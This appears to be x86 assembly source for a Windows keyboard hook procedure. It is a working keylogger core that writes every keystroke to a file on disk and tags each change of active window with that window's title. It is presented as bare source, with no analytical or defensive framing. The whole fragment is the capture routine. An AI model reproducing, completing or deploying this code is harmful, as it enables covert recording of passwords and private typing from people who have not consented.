PUBLIC hookproc
hookproc proc STDCALL, _code:DWORD, _wp:DWORD, _lp:DWORD

        call    CreateFile, offset fname, GENERIC_READWRITE, FILE_SHARE_READ, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0
        mov     _hFile, eax

        mov     eax, _lp
        and     eax, 80000000h
        jne     @_quit

        call    SetFilePointer, _hFile, -4, 0, 2
        call    ReadFile,       _hFile, offset _cpid2, 4, offset _temp, 0
        call    SetFilePointer, _hFile, -4, 0, 2
        call    GetForegroundWindow

        cmp     eax, _cpid2
        je      @_sameprocess

        mov     _cpid, eax

        call    GetWindowTextA, eax, offset _wndtext, 0FFh
        call    lstrlen,        offset _wndtext

        mov     dword ptr [_wndtext+eax], 0a0a205dh
        add     eax, 7

        call    WriteFile,      _hFile, offset _wndwrite, eax, offset _temp, 0

@_sameprocess:

        mov     ecx, keynum
        lea     edx, ktable

@_identkey:
        mov     eax, [edx]
        cmp     al, byte ptr _wp
        je      @_wf

        call    lstrlen, offset edx

        inc     eax
        add     edx, eax

        loop    @_identkey

@_wf:
        push    0
        push    offset _temp

        cmp     ecx, 0
        je      @_notfunc
        inc     edx

        call    lstrlen, offset edx

        push    eax
        push    offset edx
        jmp     @_func


@_notfunc:

        call    GetKeyboardState, offset _tks
        call    ToAscii,        dword ptr [_wp], dword ptr [_lp], offset _tks, offset _dat, 0

        cmp     eax, 0
        je      @_final

        push    1
        push    offset _dat

@_func:

        push    _hFile
        call    WriteFile

@_final:

        call    WriteFile, _hFile, offset _cpid, 4, offset _temp, 0

@_quit:

        call    CloseHandle, _hFile

        mov     eax, 0
        ret

hookproc ENDP